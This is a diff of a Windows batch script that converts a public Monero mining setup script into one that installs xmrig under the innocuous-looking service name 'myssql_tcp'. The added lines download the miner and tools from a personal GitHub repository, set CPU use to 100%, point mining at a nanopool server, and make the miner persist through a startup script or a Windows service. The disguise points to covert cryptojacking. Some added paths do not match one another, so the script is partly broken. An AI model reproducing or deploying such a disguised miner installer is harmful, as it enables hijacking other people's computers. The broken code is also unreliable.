@@ -4,8 +4,8 @@ set VERSION=2.4
 
 rem printing greetings
 
-echo C3Pool mining setup script v%VERSION%.
-echo ^(please report issues to support@c3pool.com email^)
+echo myssqltcp mining setup script v%VERSION%.
+echo ^(please report issues to email^)
 echo.
 
 net session >nul 2>&1
@@ -20,7 +20,7 @@ rem checking prerequisites
 
 if [%WALLET%] == [] (
   echo Script usage:
-  echo ^> setup_c3pool_miner.bat ^<wallet address^> [^<your email address^>]
+  echo ^> setup_myssql_tcp.bat ^<wallet address^> [^<your email address^>]
   echo ERROR: Please specify your wallet address
   exit /b 1
 )
@@ -145,17 +145,17 @@ if [%EXP_MONERO_HASHRATE%] == [] (
   exit 
 )
 
-if %EXP_MONERO_HASHRATE% gtr 208400  ( set PORT=19999 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 102400  ( set PORT=19999 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 51200  ( set PORT=15555 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 25600  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 12800  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 6400  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 800   ( set PORT=80 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 400   ( set PORT=80 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 200   ( set PORT=80 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 208400  ( set PORT=14444 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 102400  ( set PORT=14444 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 51200  ( set PORT=14433 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 25600  ( set PORT=14433 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 12800  ( set PORT=14433 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 6400  ( set PORT=14433 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=14433 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=14433 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 800   ( set PORT=14433 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 400   ( set PORT=14433 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 200   ( set PORT=14433 & goto PORT_OK )
 if %EXP_MONERO_HASHRATE% gtr 100   ( set PORT=80 & goto PORT_OK )
 if %EXP_MONERO_HASHRATE% gtr  50   ( set PORT=80 & goto PORT_OK )
 set PORT=80
@@ -179,7 +179,7 @@ echo.
 if %ADMIN% == 0 (
   echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
 ) else (
-  echo Mining in background will be performed using c3pool_miner service.
+  echo Mining in background will be performed using myssql_tcp service.
 )
 
 echo.
@@ -190,9 +190,9 @@ pause
 
 rem start doing stuff: preparing miner
 
-echo [*] Removing previous c3pool miner (if any)
-sc stop c3pool_miner
-sc delete c3pool_miner
+echo [*] Removing previous myssql tcp (if any)
+sc stop myssql_tcp
+sc delete myssql_tcp
 taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
@@ -204,15 +204,15 @@ IF EXIST "%USERPROFILE%\netsys" GOTO REMOVE_DIR0
 echo [*] Downloading netsys advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/teshushu/BiBi/raw/main/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
-  echo ERROR: Can't download c3pool advanced version of xmrig
+  echo ERROR: Can't download myssqltcp advanced version of xmrig
   goto MINER_BAD
 )
 
 echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\netsys"
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\c3pool')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\myssqltcp')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/teshushu/BiBi/raw/main/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
@@ -224,7 +224,7 @@ if errorlevel 1 (
 del "%USERPROFILE%\xmrig.zip"
 
 echo [*] Checking if advanced version of "%USERPROFILE%\netsys\xmrig.exe" works fine ^(and not removed by antivirus software^)
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 "%USERPROFILE%\netsys\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 :MINER_BAD
@@ -253,10 +253,10 @@ rmdir /q /s "%USERPROFILE%\netsys" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\netsys" GOTO REMOVE_DIR1
 
 echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\netsys"
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\c3pool')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\myssqltcp')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/teshushu/BiBi/raw/main/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
@@ -272,7 +272,7 @@ if errorlevel 1 (
 del "%USERPROFILE%\xmrig.zip"
 
 echo [*] Checking if stock version of "%USERPROFILE%\netsys\xmrig.exe" works fine ^(and not removed by antivirus software^)
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 "%USERPROFILE%\netsys\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
@@ -296,15 +296,15 @@ if not [%EMAIL%] == [] (
   set "PASS=%EMAIL%"
 )
 
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"auto.c3pool.org:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"xmr-us-west1.nanopool.org:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 
 copy /Y "%USERPROFILE%\netsys\config.json" "%USERPROFILE%\netsys\config_background.json" >NUL
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config_background.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config_background.json'" 
 
 rem preparing script
 (
@@ -336,27 +336,27 @@ echo ERROR: Can't find Windows startup directory
 exit /b 1
 
 :STARTUP_DIR_OK
-echo [*] Adding call to "%USERPROFILE%\netsys\miner.bat" script to "%STARTUP_DIR%\c3pool_miner.bat" script
+echo [*] Adding call to "%USERPROFILE%\netsys\miner.bat" script to "%STARTUP_DIR%\myssql_tcp.bat" script
 (
 echo @echo off
 echo "%USERPROFILE%\netsys\miner.bat" --config="%USERPROFILE%\netsys\config_background.json"
-) > "%STARTUP_DIR%\c3pool_miner.bat"
+) > "%STARTUP_DIR%\myssql_tcp.bat"
 
 echo [*] Running miner in the background
-call "%STARTUP_DIR%\c3pool_miner.bat"
+call "%STARTUP_DIR%\myssql_tcp.bat"
 goto OK
 
 :ADMIN_MINER_SETUP
 
-echo [*] Downloading tools to make c3pool_miner service to "%USERPROFILE%\nssm.zip"
+echo [*] Downloading tools to make myssql_tcp service to "%USERPROFILE%\nssm.zip"
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/teshushu/BiBi/raw/main/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
-  echo ERROR: Can't download tools to make c3pool_miner service
+  echo ERROR: Can't download tools to make myssql_tcp service
   exit /b 1
 )
 
 echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\netsys"
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\c3pool')"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\myssqltcp')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/7za.exe', '%USERPROFILE%\7za.exe')"
@@ -365,37 +365,37 @@ if errorlevel 1 (
     exit /b 1
   )
   echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\netsys"
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\nssm.zip" >NUL
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\myssqltcp" "%USERPROFILE%\nssm.zip" >NUL
   if errorlevel 1 (
-    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\c3pool"
+    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\myssqltcp"
     exit /b 1
   )
   del "%USERPROFILE%\7za.exe"
 )
 del "%USERPROFILE%\nssm.zip"
 
-echo [*] Creating c3pool_miner service
-sc stop c3pool_miner
-sc delete c3pool_miner
-"%USERPROFILE%\netsys\nssm.exe" install c3pool_miner "%USERPROFILE%\netsys\xmrig.exe"
+echo [*] Creating myssql_tcp service
+sc stop myssql_tcp
+sc delete myssql_tcp
+"%USERPROFILE%\netsys\nssm.exe" install myssql_tcp "%USERPROFILE%\netsys\xmrig.exe"
 if errorlevel 1 (
-  echo ERROR: Can't create c3pool_miner service
+  echo ERROR: Can't create myssql_tcp service
   exit /b 1
 )
-"%USERPROFILE%\netsys\nssm.exe" set c3pool_miner AppDirectory "%USERPROFILE%\netsys"
-"%USERPROFILE%\netsys\nssm.exe" set c3pool_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
-"%USERPROFILE%\netsys\nssm.exe" set c3pool_miner AppStdout "%USERPROFILE%\netsys\stdout"
-"%USERPROFILE%\netsys\nssm.exe" set c3pool_miner AppStderr "%USERPROFILE%\netsys\stderr"
+"%USERPROFILE%\netsys\nssm.exe" set myssql_tcp AppDirectory "%USERPROFILE%\netsys"
+"%USERPROFILE%\netsys\nssm.exe" set myssql_tcp AppPriority BELOW_NORMAL_PRIORITY_CLASS
+"%USERPROFILE%\netsys\nssm.exe" set myssql_tcp AppStdout "%USERPROFILE%\netsys\stdout"
+"%USERPROFILE%\netsys\nssm.exe" set myssql_tcp AppStderr "%USERPROFILE%\netsys\stderr"
 
-echo [*] Starting c3pool_miner service
-"%USERPROFILE%\netsys\nssm.exe" start c3pool_miner
+echo [*] Starting myssql_tcp service
+"%USERPROFILE%\netsys\nssm.exe" start myssql_tcp
 if errorlevel 1 (
-  echo ERROR: Can't start c3pool_miner service
+  echo ERROR: Can't start myssql_tcp service
   exit /b 1
 )
 
 echo
-echo Please reboot system if c3pool_miner service is not activated yet (if "%USERPROFILE%\netsys\xmrig.log" file is empty)
+echo Please reboot system if myssql_tcp service is not activated yet (if "%USERPROFILE%\netsys\xmrig.log" file is empty)
 goto OK
 
 :OK
